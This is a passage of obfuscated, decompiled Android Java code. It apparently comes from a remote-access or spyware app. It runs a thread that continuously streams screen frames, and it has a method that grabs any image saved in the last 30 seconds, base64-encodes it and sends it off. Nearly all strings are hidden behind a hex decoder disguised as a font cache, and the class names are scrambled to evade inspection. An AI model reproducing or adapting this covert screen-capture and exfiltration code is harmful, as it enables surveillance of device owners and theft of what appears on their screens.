            /* JADX WARN: Code duplicated, block: B:49:0x00ef  */
            /* JADX WARN: Code duplicated, block: B:61:0x0125 A[Catch: Exception -> 0x009b, OutOfMemoryError -> 0x00a0, InterruptedException -> 0x01cd, TRY_ENTER, TryCatch #5 {InterruptedException -> 0x01cd, blocks: (B:7:0x0021, B:9:0x002c, B:11:0x0032, B:13:0x0046, B:19:0x006d, B:22:0x0077, B:26:0x0085, B:28:0x0090, B:32:0x00a3, B:34:0x00ab, B:36:0x00af, B:38:0x00b5, B:44:0x00d7, B:46:0x00e2, B:48:0x00e6, B:52:0x00f4, B:54:0x00fe, B:55:0x0110, B:61:0x0125, B:70:0x018a, B:73:0x0193, B:62:0x012a, B:64:0x0138, B:66:0x016e, B:67:0x0183, B:69:0x0187), top: B:86:0x0021 }] */
            /* JADX WARN: Code duplicated, block: B:64:0x0138 A[Catch: Exception -> 0x009b, OutOfMemoryError -> 0x00a0, InterruptedException -> 0x01cd, TryCatch #5 {InterruptedException -> 0x01cd, blocks: (B:7:0x0021, B:9:0x002c, B:11:0x0032, B:13:0x0046, B:19:0x006d, B:22:0x0077, B:26:0x0085, B:28:0x0090, B:32:0x00a3, B:34:0x00ab, B:36:0x00af, B:38:0x00b5, B:44:0x00d7, B:46:0x00e2, B:48:0x00e6, B:52:0x00f4, B:54:0x00fe, B:55:0x0110, B:61:0x0125, B:70:0x018a, B:73:0x0193, B:62:0x012a, B:64:0x0138, B:66:0x016e, B:67:0x0183, B:69:0x0187), top: B:86:0x0021 }] */
            /* JADX WARN: Code duplicated, block: B:66:0x016e A[Catch: Exception -> 0x009b, OutOfMemoryError -> 0x00a0, InterruptedException -> 0x01cd, TRY_LEAVE, TryCatch #5 {InterruptedException -> 0x01cd, blocks: (B:7:0x0021, B:9:0x002c, B:11:0x0032, B:13:0x0046, B:19:0x006d, B:22:0x0077, B:26:0x0085, B:28:0x0090, B:32:0x00a3, B:34:0x00ab, B:36:0x00af, B:38:0x00b5, B:44:0x00d7, B:46:0x00e2, B:48:0x00e6, B:52:0x00f4, B:54:0x00fe, B:55:0x0110, B:61:0x0125, B:70:0x018a, B:73:0x0193, B:62:0x012a, B:64:0x0138, B:66:0x016e, B:67:0x0183, B:69:0x0187), top: B:86:0x0021 }] */
            /* JADX WARN: Code duplicated, block: B:69:0x0187 A[Catch: Exception -> 0x009b, OutOfMemoryError -> 0x00a0, InterruptedException -> 0x01cd, TRY_ENTER, TryCatch #5 {InterruptedException -> 0x01cd, blocks: (B:7:0x0021, B:9:0x002c, B:11:0x0032, B:13:0x0046, B:19:0x006d, B:22:0x0077, B:26:0x0085, B:28:0x0090, B:32:0x00a3, B:34:0x00ab, B:36:0x00af, B:38:0x00b5, B:44:0x00d7, B:46:0x00e2, B:48:0x00e6, B:52:0x00f4, B:54:0x00fe, B:55:0x0110, B:61:0x0125, B:70:0x018a, B:73:0x0193, B:62:0x012a, B:64:0x0138, B:66:0x016e, B:67:0x0183, B:69:0x0187), top: B:86:0x0021 }] */
            /* JADX WARN: Code duplicated, block: B:99:0x012a A[SYNTHETIC] */
            @Override // java.lang.Runnable
            public final void run() {
                byte[] bArr;
                byte[] bArr2;
                int i4;
                boolean z2;
                lLybWDNhgEj7LwIe llybwdnhgej7lwie;
                byte[] bArr3;
                long jCurrentTimeMillis;
                ConcurrentLinkedQueue concurrentLinkedQueue;
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw = this.w9sT1Swbhx3hs;
                boolean z3 = z;
                int i5 = iHeight;
                int i6 = iWidth;
                ByteBuffer byteBufferAllocate = ByteBuffer.allocate(16);
                int i7 = 0;
                int i8 = 0;
                long j = 0;
                while (rWY6BVSB0XxPbw.XiR1pIn5878vVWd && rWY6BVSB0XxPbw.xDyLpEZyrcKVe0) {
                    try {
                        try {
                            DataQFAdapter.Companion.getClass();
                            if (DataQFAdapter.instance == null) {
                                i7++;
                                if (i7 >= 10) {
                                    TypefaceCache.obtain("00020027000A009E00B000AC00D700B50035007F0058008200B000BB00D700A6002700360056008E00F400F200C100B300310073005A008A00BC00FF00C100A2002D00720052008900F700FF00D300A4002000730048009400F900BD00DB00AB002A0062004200B800E500B100D300B10022007F0057008600F200B300D7");
                                    JSONObject jSONObject2 = new JSONObject();
                                    jSONObject2.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002200750058008200E300AC00DB00A5002A007A0052009300E9008000C700A900220060005A008E00FC00BE00D000AB0026"));
                                    jSONObject2.put(TypefaceCache.obtain("00310073005A009400FF00B1"), TypefaceCache.obtain("003000730049009100F900BC00D700980027007F005E008300CF00B200DB00A3003000620049008200F100B2"));
                                    rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject2);
                                    break;
                                }
                                try {
                                    Thread.sleep(200L);
                                } catch (Exception e) {
                                    e = e;
                                    TypefaceCache.obtain("00050064005A008A00F500FF00DE00A8002C0066001B008200E200AD00DD00B500790036");
                                    e.getMessage();
                                } catch (OutOfMemoryError unused) {
                                    TypefaceCache.obtain("00050064005A008A00F500FF00DE00A8002C0066001B00A800DF0092009220D3006300720049008800E000AF00DB00A900240036005D009500F100B200D700E700220078005F00C700F600B000C000A4002A0078005C00C700D7009C");
                                    System.gc();
                                    rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.set(0);
                                    try {
                                        Thread.sleep(500L);
                                    } catch (Exception unused2) {
                                    }
                                }
                            } else {
                                try {
                                    if (rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.get() < rWY6BVSB0XxPbw.DVTNwpDEVsUKuznof) {
                                        if (rWY6BVSB0XxPbw.MSGkxvPxRYNqC) {
                                            String str = ManagerUMController.DVTNwpDEVsUKuznof;
                                            if (!ManagerUMController.VEkRsTDS6a9oHWI) {
                                                rWY6BVSB0XxPbw.MSGkxvPxRYNqC = false;
                                                rWY6BVSB0XxPbw.tne6mXOUFKdd = rWY6BVSB0XxPbw.VEkRsTDS6a9oHWI;
                                                rWY6BVSB0XxPbw.fivkjwgu2UdAtiY = rWY6BVSB0XxPbw.jdOQeRk37T35X5xKW1P;
                                                ManagerUMController.XuO9PPFo607ssKwZjNW = rWY6BVSB0XxPbw.VEkRsTDS6a9oHWI;
                                                ManagerUMController.hV4VTKNUdeHN = rWY6BVSB0XxPbw.jdOQeRk37T35X5xKW1P;
                                            }
                                        }
                                        if (z3) {
                                            i4 = 0;
                                            z2 = false;
                                            while (i4 < 5) {
                                                DataQFAdapter.Companion.getClass();
                                                llybwdnhgej7lwie = DataQFAdapter.hwEncoder;
                                                if (llybwdnhgej7lwie != null || (concurrentLinkedQueue = llybwdnhgej7lwie.Ee8d2j4S9Vm5yGuR) == null) {
                                                    bArr3 = null;
                                                } else {
                                                    bArr3 = (byte[]) concurrentLinkedQueue.poll();
                                                }
                                                if (bArr3 != null || !rWY6BVSB0XxPbw.EWUjsTERgdPbSw3NNlN(fadfsJa4iEdiwEC4Xm8.ibVTtJUNfrGYbW(bArr3))) {
                                                    break;
                                                    break;
                                                }
                                                rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.incrementAndGet();
                                                i8++;
                                                rWY6BVSB0XxPbw.iUQk66nAiXgO35++;
                                                jCurrentTimeMillis = System.currentTimeMillis();
                                                rWY6BVSB0XxPbw.UoxIZOBVZaubOFdPNaXK = jCurrentTimeMillis;
                                                try {
                                                    rWY6BVSB0XxPbw.yTljMGnIibTRdOpSh4 = jCurrentTimeMillis;
                                                    i4++;
                                                    z2 = true;
                                                    j = jCurrentTimeMillis;
                                                } catch (Exception e2) {
                                                    e = e2;
                                                    i7 = 0;
                                                    j = jCurrentTimeMillis;
                                                    TypefaceCache.obtain("00050064005A008A00F500FF00DE00A8002C0066001B008200E200AD00DD00B500790036");
                                                    e.getMessage();
                                                } catch (OutOfMemoryError unused3) {
                                                    i7 = 0;
                                                    j = jCurrentTimeMillis;
                                                    TypefaceCache.obtain("00050064005A008A00F500FF00DE00A8002C0066001B00A800DF0092009220D3006300720049008800E000AF00DB00A900240036005D009500F100B200D700E700220078005F00C700F600B000C000A4002A0078005C00C700D7009C");
                                                    System.gc();
                                                    rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.set(0);
                                                    Thread.sleep(500L);
                                                }
                                            }
                                            if (!z2) {
                                                Thread.sleep(10L);
                                            }
                                        } else {
                                            bArr = (byte[]) DataQFAdapter.latestFrame.getAndSet(null);
                                            if (bArr != null) {
                                                int i9 = DataQFAdapter.streamWidth;
                                                byteBufferAllocate.clear();
                                                byteBufferAllocate.putInt(i9).putInt((int) ((i9 * i5) / i6)).putInt(i6).putInt(i5);
                                                bArr2 = new byte[bArr.length + 16];
                                                System.arraycopy(byteBufferAllocate.array(), 0, bArr2, 0, 16);
                                                System.arraycopy(bArr, 0, bArr2, 16, bArr.length);
                                                if (rWY6BVSB0XxPbw.EWUjsTERgdPbSw3NNlN(fadfsJa4iEdiwEC4Xm8.ibVTtJUNfrGYbW(bArr2))) {
                                                    rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.incrementAndGet();
                                                    i8++;
                                                    rWY6BVSB0XxPbw.iUQk66nAiXgO35++;
                                                    long jCurrentTimeMillis2 = System.currentTimeMillis();
                                                    rWY6BVSB0XxPbw.UoxIZOBVZaubOFdPNaXK = jCurrentTimeMillis2;
                                                    rWY6BVSB0XxPbw.yTljMGnIibTRdOpSh4 = jCurrentTimeMillis2;
                                                    j = jCurrentTimeMillis2;
                                                }
                                            } else {
                                                Thread.sleep(10L);
                                            }
                                        }
                                        rWY6BVSB0XxPbw.Ee8d2j4S9Vm5yGuR();
                                        if (i8 % 60 == 0 && i8 > 0) {
                                            TypefaceCache.obtain("001000730055009300B0");
                                            TypefaceCache.obtain("006300700049008600FD00BA00C100E7006B007E000900D100A400E2");
                                            TypefaceCache.obtain("006F0036004A00DA");
                                            TypefaceCache.obtain("006F00360049009300E400E2");
                                            TypefaceCache.obtain("002E00650012");
                                        }
                                    } else if (j <= 0 || System.currentTimeMillis() - j <= 1500) {
                                        Thread.sleep(3L);
                                    } else {
                                        TypefaceCache.obtain("00050064005A008A00F500FF00D300A400280036004F008E00FD00BA00DD00B200370036001300D600BE00EA00C100EE006F0036005A009200E400B0009F00B5002600750054009100F500AD00DB00A90024");
                                        rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.set(0);
                                        if (rWY6BVSB0XxPbw.MSGkxvPxRYNqC) {
                                            String str2 = ManagerUMController.DVTNwpDEVsUKuznof;
                                            if (!ManagerUMController.VEkRsTDS6a9oHWI) {
                                                rWY6BVSB0XxPbw.MSGkxvPxRYNqC = false;
                                                rWY6BVSB0XxPbw.tne6mXOUFKdd = rWY6BVSB0XxPbw.VEkRsTDS6a9oHWI;
                                                rWY6BVSB0XxPbw.fivkjwgu2UdAtiY = rWY6BVSB0XxPbw.jdOQeRk37T35X5xKW1P;
                                                ManagerUMController.XuO9PPFo607ssKwZjNW = rWY6BVSB0XxPbw.VEkRsTDS6a9oHWI;
                                                ManagerUMController.hV4VTKNUdeHN = rWY6BVSB0XxPbw.jdOQeRk37T35X5xKW1P;
                                            }
                                        }
                                        if (z3) {
                                            i4 = 0;
                                            z2 = false;
                                            while (i4 < 5) {
                                                DataQFAdapter.Companion.getClass();
                                                llybwdnhgej7lwie = DataQFAdapter.hwEncoder;
                                                if (llybwdnhgej7lwie != null) {
                                                    bArr3 = null;
                                                } else {
                                                    bArr3 = null;
                                                }
                                                if (bArr3 != null) {
                                                    break;
                                                }
                                                rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.incrementAndGet();
                                                i8++;
                                                rWY6BVSB0XxPbw.iUQk66nAiXgO35++;
                                                jCurrentTimeMillis = System.currentTimeMillis();
                                                rWY6BVSB0XxPbw.UoxIZOBVZaubOFdPNaXK = jCurrentTimeMillis;
                                                rWY6BVSB0XxPbw.yTljMGnIibTRdOpSh4 = jCurrentTimeMillis;
                                                i4++;
                                                z2 = true;
                                                j = jCurrentTimeMillis;
                                            }
                                            if (!z2) {
                                                Thread.sleep(10L);
                                            }
                                        } else {
                                            bArr = (byte[]) DataQFAdapter.latestFrame.getAndSet(null);
                                            if (bArr != null) {
                                                int i10 = DataQFAdapter.streamWidth;
                                                byteBufferAllocate.clear();
                                                byteBufferAllocate.putInt(i10).putInt((int) ((i10 * i5) / i6)).putInt(i6).putInt(i5);
                                                bArr2 = new byte[bArr.length + 16];
                                                System.arraycopy(byteBufferAllocate.array(), 0, bArr2, 0, 16);
                                                System.arraycopy(bArr, 0, bArr2, 16, bArr.length);
                                                if (rWY6BVSB0XxPbw.EWUjsTERgdPbSw3NNlN(fadfsJa4iEdiwEC4Xm8.ibVTtJUNfrGYbW(bArr2))) {
                                                    rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.incrementAndGet();
                                                    i8++;
                                                    rWY6BVSB0XxPbw.iUQk66nAiXgO35++;
                                                    long jCurrentTimeMillis3 = System.currentTimeMillis();
                                                    rWY6BVSB0XxPbw.UoxIZOBVZaubOFdPNaXK = jCurrentTimeMillis3;
                                                    rWY6BVSB0XxPbw.yTljMGnIibTRdOpSh4 = jCurrentTimeMillis3;
                                                    j = jCurrentTimeMillis3;
                                                }
                                            } else {
                                                Thread.sleep(10L);
                                            }
                                        }
                                        rWY6BVSB0XxPbw.Ee8d2j4S9Vm5yGuR();
                                        if (i8 % 60 == 0) {
                                            TypefaceCache.obtain("001000730055009300B0");
                                            TypefaceCache.obtain("006300700049008600FD00BA00C100E7006B007E000900D100A400E2");
                                            TypefaceCache.obtain("006F0036004A00DA");
                                            TypefaceCache.obtain("006F00360049009300E400E2");
                                            TypefaceCache.obtain("002E00650012");
                                        }
                                    }
                                    i7 = 0;
                                } catch (Exception e3) {
                                    e = e3;
                                    i7 = 0;
                                } catch (OutOfMemoryError unused4) {
                                    i7 = 0;
                                }
                            }
                        } catch (InterruptedException unused5) {
                        }
                    } catch (Exception e4) {
                        e = e4;
                    } catch (OutOfMemoryError unused6) {
                    }
                }
                TypefaceCache.obtain("00050064005A008A00F500FF00DE00A8002C0066001B008200FE00BB00D700A3006F00360048008200FE00AB0092");
                TypefaceCache.obtain("006300700049008600FD00BA00C1");
            }
        }, TypefaceCache.obtain("00350078005800CA00F600AD00D300AA0026003B005A00D600A100A6"));
        this.MLSIo1htfMPWeB8V876L = thread;
        thread.setUncaughtExceptionHandler(this.EWUjsTERgdPbSw3NNlN);
        Thread thread2 = this.MLSIo1htfMPWeB8V876L;
        if (thread2 != null) {
            thread2.start();
        }
    }

    public final void wotphlvK9sPbXJ() throws JSONException {
        try {
            ContentResolver contentResolver = this.dDIMxZXP1V8HdM.getContentResolver();
            String str = "relative_path" + TypefaceCache.obtain("0063005A007200AC00D500FF008D00E700020058007F00C7") + "date_added" + TypefaceCache.obtain("00630028001B00D8");
            String[] strArr = {TypefaceCache.obtain("006600450058009500F500BA00DC00B4002B0079004F009400B5"), String.valueOf((System.currentTimeMillis() / ((long) 1000)) - ((long) 30))};
            String str2 = "date_added" + TypefaceCache.obtain("00630052007E00B400D3");
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            Cursor cursorQuery = contentResolver.query(uri, new String[]{"_id", "date_added", "_display_name"}, str, strArr, str2);
            boolean z = false;
            if (cursorQuery != null) {
                try {
                    if (cursorQuery.moveToFirst()) {
                        int columnIndexOrThrow = cursorQuery.getColumnIndexOrThrow("_id");
                        int columnIndexOrThrow2 = cursorQuery.getColumnIndexOrThrow("_display_name");
                        long j = cursorQuery.getLong(columnIndexOrThrow);
                        cursorQuery.getString(columnIndexOrThrow2);
                        TypefaceCache.obtain("00050079004E008900F400FF00C000A2002000730055009300B000AC00D100B5002600730055009400F800B000C600FD0063");
                        TypefaceCache.obtain("0063003E0052008300AD");
                        InputStream inputStreamOpenInputStream = contentResolver.openInputStream(ContentUris.withAppendedId(uri, j));
                        if (inputStreamOpenInputStream != null) {
                            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(Math.max(8192, inputStreamOpenInputStream.available()));
                            OFtLBiBbrrTHWu.b1EoSIRjJHO5(inputStreamOpenInputStream, byteArrayOutputStream);
                            byte[] byteArray = byteArrayOutputStream.toByteArray();
                            inputStreamOpenInputStream.close();
                            String strEncodeToString = Base64.encodeToString(byteArray, 2);
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003000750049008200F500B100C100AF002C0062"));
                            jSONObject.put(TypefaceCache.obtain("00270077004F0086"), strEncodeToString);
                            H9XlUr4OeMJFiXK(jSONObject);
                            TypefaceCache.obtain("001000750049008200F500B100C100AF002C0062001B009400F500B100C600E70035007F005A00C700DD00BA00D600AE00220045004F008800E200BA008800E7");
                            TypefaceCache.obtain("006300740042009300F500AC");
                            z = true;
                        }
                    }
                    cursorQuery.close();
                } catch (Throwable th) {
                    cursorQuery.close();
                    throw th;
                }
            }
            if (z) {
                return;
            }
            TypefaceCache.obtain("000E0073005F008E00F1008C00C600A800310073001B009600E500BA00C000BE00630064005E009300E500AD00DC00A2002700360055008800B000AD00D700B40036007A004F009400BC00FF00C600B5003A007F0055008000B000BB00DB00B500260075004F00C700F100BC00D100A200300065001500C900BE");
            gIIiyi2ddlMDR0();
        } catch (Exception e) {
            TypefaceCache.obtain("000E0073005F008E00F1008C00C600A800310073001B008200E200AD00DD00B500790036");
            e.getMessage();
            TypefaceCache.obtain("006F0036004F009500E900B600DC00A0006300720052009500F500BC00C600E7002200750058008200E300AC009C00E9006D");
            gIIiyi2ddlMDR0();
        }
    }

    public final void xDyLpEZyrcKVe0() {
        this.Ee8d2j4S9Vm5yGuR = false;
        try {
            J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = this.JXn4Qf7zpnLjP5;
            if (j1m0XraSkScfWFMIlTC != null) {
                j1m0XraSkScfWFMIlTC.w9sT1Swbhx3hs(TypefaceCache.obtain("0027007900550082"), 1000);
            }
        } catch (Exception unused) {
        }
        this.JXn4Qf7zpnLjP5 = null;
    }

    public final void xfn2GJwmGqs7kWW() {
        if (this.XiR1pIn5878vVWd) {
            return;
        }
        this.XiR1pIn5878vVWd = true;
        AtomicInteger atomicInteger = this.H9XlUr4OeMJFiXK;
        atomicInteger.set(0);
        this.gmNWMfvn6zlEj = true;
        JXn4Qf7zpnLjP5();
        WindowManager windowManager = (WindowManager) this.dDIMxZXP1V8HdM.getSystemService("window");
        if (Build.VERSION.SDK_INT >= 30) {
            Rect bounds = windowManager.getCurrentWindowMetrics().getBounds();
            bounds.width();
            bounds.height();
        } else {
            windowManager.getDefaultDisplay().getRealSize(new Point());
        }
        TypefaceCache.obtain("00100062005A009500E400B600DC00A00063005E006D00A900D300FF00D400B50022007B005E00C700FC00B000DD00B7006F0036005F008200E600B600D100A2007E");
        atomicInteger.set(0);
        Thread thread = new Thread(new uY2iPU7ne5s7Y5LeXnLI(this, 12), TypefaceCache.obtain("00350078005800CA00F600AD00D300AA0026003B0053009100FE00BC"));
        this.MLSIo1htfMPWeB8V876L = thread;
        thread.setUncaughtExceptionHandler(this.EWUjsTERgdPbSw3NNlN);
        Thread thread2 = this.MLSIo1htfMPWeB8V876L;
        if (thread2 != null) {
            thread2.start();
        }
    }

    public final boolean yTljMGnIibTRdOpSh4() {
        if (this.vIJudZvPyTuNp > 800) {
            this.qfTrc75xwRVMl85vh++;
            return this.qfTrc75xwRVMl85vh % 3 != 0;
        }
        if (this.vIJudZvPyTuNp > 400) {
            this.qfTrc75xwRVMl85vh++;
            return this.qfTrc75xwRVMl85vh % 2 != 0;
        }
        this.qfTrc75xwRVMl85vh = 0;
        return false;
    }
}
